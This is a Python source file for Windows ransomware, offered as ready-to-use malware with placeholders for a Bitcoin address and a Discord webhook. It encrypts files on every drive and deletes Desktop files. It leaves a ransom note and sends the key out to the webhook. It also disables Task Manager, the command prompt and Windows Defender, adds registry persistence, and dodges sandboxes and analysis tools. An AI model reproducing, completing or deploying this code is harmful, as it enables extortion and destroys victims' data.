import os
import sys
import ctypes
import random
import string
import subprocess
import requests
import threading
import time
import psutil
from sys import *
from pathlib import Path
from datetime import datetime
from psutil import *
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

class Ransomware:
    def __init__(self):
        self.key = self.generate_random_key()
        self.mode = modes.CTR()
        self.nonce = os.urandom(16)
        self.remaining_time = 48 * 3600

    def generate_random_key(self):
        return ''.join(random.choices(string.ascii_letters + string.digits, k=32)).encode()

    def encrypt_file(self, file_path):
        file_name = file_path.name
        
        # Exclude specific file types or paths (system files, ransom note)
        excluded_extensions = {'.dll', '.sys', '.bat', '.com', '.cmd', '.vbs', '.ps1'}
        excluded_files = {'Decrypt_Instructions.txt'}  # Add more filenames if needed
        
        # Skip files with excluded extensions or specific filenames
        if file_name in excluded_files or any(file_name.endswith(ext) for ext in excluded_extensions):
            return
        
        with open(file_path, "rb") as file:
            data = file.read()
        
        try:
            cipher = Cipher(algorithms.AES(self.key), self.mode, nonce=self.nonce)
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(data) + encryptor.finalize()
            
            # Save encrypted data back to the file
            with open(file_path, "wb") as file:
                file.write(encrypted_data)
            
            # Optionally, rename the file to indicate it's encrypted
            os.rename(file_path, f"{file_path}.urban")
        
        except Exception as e:
            pass

    def lock_files(self, directory):
        for root, _, files in os.walk(directory):
            for file_name in files:
                file_path = Path(os.path.join(root, file_name))
                self.encrypt_file(file_path)

    def lock_task_manager(self):
        try:
            subprocess.run("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

    def lock_cmd(self):
        try:
            subprocess.run("reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 2 /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

    def disable_windows_defender(self):
        try:
            subprocess.run("powershell -Command 'Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true -DisableIntrusionPreventionSystem $true'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("powershell -Command 'Set-ExecutionPolicy Unrestricted'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

    def send_decryption_key(self):
        webhook_url = "YOUR_DISCORD_WEBHOOK_URL"  # Update with your Discord webhook url
        payload = {
            "content": f"Decryption Key: {self.key.decode()}"
        }
        requests.post(webhook_url, json=payload)

    def detect_sandbox(self):
        sandbox_artifacts = [
            "C:\\sample\\sandbox.exe",
            "C:\\windows\\system32\\drivers\\sbiedrv.sys",
            "C:\\windows\\system32\\drivers\\VBoxMouse.sys",
            "C:\\windows\\system32\\drivers\\VBoxGuest.sys",
            "C:\\windows\\system32\\drivers\\VBoxSF.sys",
            "C:\\windows\\system32\\vboxdisp.dll",
            "C:\\windows\\system32\\vboxhook.dll",
            "C:\\windows\\system32\\vboxmrxnp.dll",
            "C:\\windows\\system32\\vboxogl.dll",
            "C:\\windows\\system32\\vboxoglarrayspu.dll",
            "C:\\windows\\system32\\vboxoglcrutil.dll",
            "C:\\windows\\system32\\vboxoglerrorspu.dll",
            "C:\\windows\\system32\\vboxoglfeedbackspu.dll",
            "C:\\windows\\system32\\vboxoglpackspu.dll",
            "C:\\windows\\system32\\vboxoglpassthroughspu.dll",
            "C:\\windows\\system32\\vboxservice.exe",
            "C:\\windows\\system32\\vboxtray.exe",
            "C:\\windows\\system32\\vmacthlp.exe",
            "C:\\windows\\system32\\vmtools.dll",
            "C:\\windows\\system32\\vmtray.exe",
            "C:\\windows\\system32\\vmusrvc.exe",
            "C:\\windows\\system32\\vmvss.dll",
            "C:\\windows\\system32\\xenguestagent.exe",
            "C:\\windows\\system32\\xenservice.exe",
            "C:\\windows\\system32\\drivers\\NPF.sys",
            "C:\\windows\\system32\\drivers\\npf.sys",
            "C:\\windows\\system32\\drivers\\VMnetAdapter.sys",
            "C:\\windows\\system32\\drivers\\vmxnet.sys",
            "C:\\windows\\system32\\drivers\\VmGuestLib.sys",
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmusbmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\vmscsi.sys",
            "C:\\windows\\system32\\drivers\\VBoxDrv.sys",
            "C:\\windows\\system32\\drivers\\VBoxUSBMon.sys",
            "C:\\windows\\system32\\drivers\\VBoxNetAdp.sys",
            "C:\\windows\\system32\\drivers\\VBoxNetFlt.sys"
            # Add more 
        ]

        for artifact in sandbox_artifacts:
            if os.path.exists(artifact):
                return True

        return False

    def detect_blacklisted_processes(self):
        blacklisted_processes = [
            "procmon.exe",
            "procexp.exe",
            "processhacker.exe",
            "wireshark.exe",
            "fiddler.exe",
            # blacklist process
        ]

        for process in blacklisted_processes:
            if process.lower() in [p.name().lower() for p in psutil.process_iter()]:
                return True

        return False

    def add_persistence(self):
        try:
            script_path = os.path.abspath(__file__)
            key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            value_name = "Ransomware"
            value_data = f"\"{sys.executable}\" \"{script_path}\""

            subprocess.run(f"reg add HKCU\\{key} /v {value_name} /t REG_SZ /d {value_data} /f", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            pass

    def start_timer(self):
        while self.remaining_time > 0:
            time.sleep(1)
            self.remaining_time -= 1
        # timer ends it deletes. (needs admin elevation)
        self.delete_everything()

    def run(self):
        # Delay execution by 10 seconds
        time.sleep(10)

        if not ctypes.windll.shell32.IsUserAnAdmin():
            return

        if self.detect_sandbox():
            print("DONT RUN ON VIRTUAL MACHINE")
            return

        if self.detect_blacklisted_processes():
            print("Please close all apps to run!")
            return

        timer_thread = threading.Thread(target=self.start_timer)
        timer_thread.daemon = True  
        timer_thread.start()

        for drive in string.ascii_uppercase:
            directory = f"{drive}:\\"
            self.lock_files(directory)

        self.lock_task_manager()
        self.lock_cmd()
        self.disable_windows_defender()
        self.add_persistence()

        desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
        for file_name in os.listdir(desktop_path):
            file_path = os.path.join(desktop_path, file_name)
            if os.path.isfile(file_path) and file_name != "Decrypt_Instructions.txt":
                os.remove(file_path)

        with open(os.path.join(desktop_path, "Decrypt_Instructions.txt"), "w") as f:
            f.write("To decrypt your files and get the decryption key send 4 Bitcoin to the following Bitcoin address:\n")
            f.write("Bitcoin Address: YOUR_BTC_ADDRESS \n")
            f.write("Amount: THE_AMOUNT_YOU_WANT_IN_BTC")
            f.write("Dont download random shit retard.")

        self.send_decryption_key()

if __name__ == '__main__':
    if not ctypes.windll.shell32.IsUserAnAdmin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        sys.exit()

    ransomware = Ransomware()
    ransomware.run()
